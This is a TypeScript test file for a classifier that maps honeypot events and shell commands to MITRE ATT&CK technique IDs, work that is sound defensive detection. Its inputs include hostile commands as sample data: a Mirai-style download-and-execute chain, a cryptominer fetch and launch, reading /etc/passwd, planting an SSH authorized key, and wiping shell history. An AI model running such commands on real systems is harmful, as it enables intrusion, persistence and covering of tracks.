import { describe, expect, it } from "vitest";
import { classify } from "../src/attck.js";

const ids = (e: Parameters<typeof classify>[0]) => classify(e).map((t) => t.id).sort();

describe("ATT&CK classifier", () => {
  it("maps SSH and Telnet connections to remote-services techniques", () => {
    expect(ids({ type: "session_connect", protocol: "ssh" })).toEqual(["T1021.004"]);
    expect(ids({ type: "session_connect", protocol: "telnet" })).toEqual(["T1021"]);
  });

  it("maps login attempts to password guessing, plus default accounts on success", () => {
    expect(ids({ type: "login_attempt", success: 0 })).toEqual(["T1110.001"]);
    expect(ids({ type: "login_attempt", success: 1 })).toEqual(["T1078.001", "T1110.001"]);
  });

  it("every shell command implies Unix Shell execution", () => {
    expect(ids({ type: "command", command: "echo hi" })).toContain("T1059.004");
  });

  it("classifies a typical Mirai-style downloader chain", () => {
    const got = ids({
      type: "command",
      command: "cd /tmp; wget http://198.51.100.23/bins/mirai.x86 -O .x; chmod 777 .x; ./.x",
    });
    expect(got).toContain("T1105"); // ingress tool transfer
    expect(got).toContain("T1222.002"); // chmod 777
  });

  it("classifies recon commands as discovery", () => {
    expect(ids({ type: "command", command: "uname -a" })).toContain("T1082");
    expect(ids({ type: "command", command: "cat /proc/cpuinfo" })).toContain("T1082");
    expect(ids({ type: "command", command: "ifconfig" })).toContain("T1016");
    expect(ids({ type: "command", command: "ps aux" })).toContain("T1057");
  });

  it("classifies credential dumping, persistence, and anti-forensics", () => {
    expect(ids({ type: "command", command: "cat /etc/passwd" })).toContain("T1003.008");
    expect(ids({ type: "command", command: "echo k >> ~/.ssh/authorized_keys" })).toContain("T1098.004");
    expect(ids({ type: "command", command: "crontab -l" })).toContain("T1053.003");
    expect(ids({ type: "command", command: "history -c" })).toContain("T1070");
    expect(ids({ type: "command", command: "rm -f ~/.bash_history" })).toContain("T1070");
  });

  it("classifies cryptominer activity as resource hijacking", () => {
    expect(ids({ type: "command", command: "wget http://203.0.113.7/xmrig" })).toContain("T1496");
    expect(ids({ type: "command", command: "./mine -o stratum+tcp://203.0.113.9:3333" })).toContain("T1496");
  });

  it("maps file downloads to ingress tool transfer", () => {
    expect(ids({ type: "file_download" })).toEqual(["T1105"]);
  });

  it("deduplicates techniques within one event", () => {
    const got = ids({ type: "command", command: "wget http://x.test/a; curl http://x.test/b" });
    expect(got.filter((id) => id === "T1105")).toHaveLength(1);
  });

  it("returns nothing for non-attack events", () => {
    expect(ids({ type: "session_closed" })).toEqual([]);
    expect(ids({ type: "client_version" })).toEqual([]);
  });
});
